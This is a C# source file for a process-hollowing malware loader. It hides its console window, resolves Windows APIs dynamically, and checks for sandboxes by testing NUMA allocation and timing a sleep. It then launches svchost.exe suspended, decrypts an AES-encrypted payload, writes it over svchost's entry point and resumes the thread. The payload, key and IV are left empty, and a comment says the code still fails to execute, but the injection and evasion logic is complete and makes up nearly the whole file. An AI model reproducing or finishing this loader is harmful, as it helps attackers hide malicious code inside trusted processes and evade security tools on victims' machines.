using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

//STILL GOT ERRORS ON NOT EXECUTING

namespace ProcessHollowing
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        private struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
        private static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
        );


        private static byte[] PerformCryptography(byte[] buf, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(buf, 0, buf.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }

        public static byte[] Decrypt(byte[] buf, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.Zeros;
                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(buf, decryptor);
                }
            }
        }

        public static void Main(string[] args)
        {
            var pointer = DynamicInvoke.GetLibraryAddress("user32.dll", "ShowWindow");
            var dShowWindow = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.ShowWindow)) as DynamicInvoke.ShowWindow;

            pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "GetConsoleWindow");
            var dGetConsoleWindow = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.GetConsoleWindow)) as DynamicInvoke.GetConsoleWindow;
            dShowWindow(dGetConsoleWindow(), 0);

            pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "VirtualAllocExNuma");
            var dVirtualAllocExNuma = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.VirtualAllocExNuma)) as DynamicInvoke.VirtualAllocExNuma;

            pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "GetCurrentProcess");
            var dGetCurrentProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.GetCurrentProcess)) as DynamicInvoke.GetCurrentProcess;
            IntPtr mem = dVirtualAllocExNuma(dGetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            DateTime t1 = DateTime.Now;
            pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "Sleep");
            var dSleep = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.Sleep)) as DynamicInvoke.Sleep;
            dSleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();





            //pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "CreateProcess");
            //var dCreateProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.CreateProcess)) as DynamicInvoke.CreateProcess;
            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);




            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;


            pointer = DynamicInvoke.GetLibraryAddress("ntdll.dll", "ZwQueryInformationProcess");
            var dZwQueryInformationProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.ZwQueryInformationProcess)) as DynamicInvoke.ZwQueryInformationProcess;
            dZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[8];
            IntPtr nRead = IntPtr.Zero;

            pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "ReadProcessMemory");
            var dReadProcessMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.ReadProcessMemory)) as DynamicInvoke.ReadProcessMemory;
            dReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            dReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = (uint) BitConverter.ToInt64(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = (uint) BitConverter.ToInt64(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            string finalPayload = "";
            byte[] key = new byte[] {  };
            byte[] iv = new byte[] {  };
            byte[] decrypted_data = Decrypt(Convert.FromBase64String(finalPayload), key, iv);

            pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
            var dWriteProcessMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.WriteProcessMemory)) as DynamicInvoke.WriteProcessMemory;
            dWriteProcessMemory(hProcess, addressOfEntryPoint, decrypted_data, decrypted_data.Length, out nRead);

            pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "ResumeThread");
            var dResumeThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.ResumeThread)) as DynamicInvoke.ResumeThread;
            dResumeThread(pi.hThread);
        }
    }
}
